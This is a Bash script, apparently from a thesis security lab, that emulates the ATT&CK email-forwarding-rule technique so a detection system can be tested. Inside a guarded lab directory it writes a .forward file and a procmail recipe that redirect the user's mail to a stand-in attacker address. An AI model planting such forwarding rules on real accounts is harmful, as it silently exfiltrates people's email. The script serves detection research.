#!/usr/bin/env bash
# ============================================================================
# ATA015 · T1114.003 Email Forwarding Rule — ataque MANUAL (escrito por el TFG)
# ----------------------------------------------------------------------------
# Tecnica : T1114.003 Email Collection: Email Forwarding Rule (Collection)
# Fuente  : custom (mecanismo de PERSISTENCIA de reenvio; no requiere red)
# Objetivo: NO robar correo, sino CREAR una REGLA DE REENVIO (persistencia) para que
#           el correo futuro de la victima se reenvie a un buzon del atacante. La regla
#           es un FICHERO de configuracion (.forward / .procmailrc) en la ruta VIGILADA
#           /home/angel/lab-legit -> mecanismo distinto de "leer" (ATA014).
# Destino : /home/angel/lab-legit/.forward y .procmailrc (VIGILADO -> evento watch)
#           copia en /home/angel/lab-attack/ATA015/ (NO vigilado -> execve)
# Elevacion: NO (usuario angel). No se toca el MTA real ni PAM ni /etc.
#
# GUARDARRAILES (abortan si no se cumplen):
#   - la copia DEBE quedar bajo $HOME/lab-attack/ATA015/;
#   - la regla solo se escribe en lab-legit; JAMAS en el HOME real ni en /etc;
#   - el dominio de reenvio es SIMBOLICO del laboratorio (no es un buzon real).
#
# Telemetria esperada (ver README §7):
#   - execve de cat/cp/grep -> 80792 (deteccion; senales T1114.003-S1..S3) ancladas por S4.
#   - CREACION de la regla (escritura en lab-legit) -> watch 80790/80781/80782 -> AMBIGUA
#     (efecto del ataque, no deteccion declarada) -> veredicto humano `artefacto`.
#
# Prueba de exito (INDEPENDIENTE de la alerta): la regla de reenvio existe, contiene el
#   destino del atacante y la copia en lab-attack es identica (mismo sha256).
# Salida: marcadores T0 / T1_LOCAL en stdout (UTC).
# ============================================================================
set -u

BASE="${HOME}/lab-attack/ATA015"
LEGIT="${HOME}/lab-legit"
FWD="${LEGIT}/.forward"
PROC="${LEGIT}/.procmailrc"
OUT="${BASE}/collected"
EXFIL="dropbox@exfil-lab.example"   # destino SIMBOLICO (no es un buzon real)

echo "ATA015 · T1114.003 Email Forwarding Rule (crear .forward/.procmailrc) — custom (manual)"
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# --- precondiciones (fallan ruidosamente, sin tocar nada) ---
if [ ! -d "$BASE" ]; then
  echo "ERROR: no existe $BASE (¿scp del directorio de la tecnica?)" >&2
  exit 1
fi
for t in cat cp grep mkdir sha256sum; do
  if ! command -v "$t" >/dev/null 2>&1; then
    echo "ERROR: $t no disponible" >&2
    exit 1
  fi
done

# cwd determinista = carpeta del ataque (ancla H4 del execve)
cd "$BASE" || { echo "ERROR: no puedo cd a $BASE" >&2; exit 1; }

# GUARDARRAIL: la copia debe quedar bajo la carpeta del ataque
case "$OUT" in
  "$HOME/lab-attack/ATA015"*) : ;;
  *) echo "ERROR: destino '$OUT' no esta bajo lab-attack/ATA015 (abortado por seguridad)" >&2; exit 1 ;;
esac

# 1) CREAR la REGLA DE REENVIO en la ruta VIGILADA (execve de cat).
cat > "$FWD" <<FWD
# Reenvio: todo el correo de angel se redirige al buzon del atacante.
$EXFIL
FWD

cat > "$PROC" <<'PROC'
# Receta procmail: reenviar el correo que ya venia "cosechado".
:0
* ^To:.*angel@empresa.local
! dropbox@exfil-lab.example
PROC

# 2) VERIFICAR/LEER la regla creada (execve de grep).
grep -n "$EXFIL" "$FWD" "$PROC"

# 3) COLECCION: copiar la regla a la carpeta del ataque (execve de cp).
mkdir -p "$OUT"
cp -f "$FWD"  "$OUT/forward"
cp -f "$PROC" "$OUT/procmailrc"

# 4) PRUEBA DE EXITO (las reglas existen y la copia es identica).
s1=$(sha256sum "$FWD"  | awk '{print $1}')
s2=$(sha256sum "$OUT/forward" | awk '{print $1}')
echo "--- estado final ---"
ls -l "$FWD" "$PROC" "$OUT/"
echo "sha256 .forward origen = $s1"
echo "sha256 copia          = $s2"
if [ -s "$FWD" ] && [ -s "$PROC" ] && [ "$s1" = "$s2" ] && grep -q "$EXFIL" "$OUT/procmailrc"; then
  echo "REENVIO=OK (regla de reenvio creada; destino $EXFIL)"
else
  echo "REENVIO=FALLO" >&2
fi
sleep 1
echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
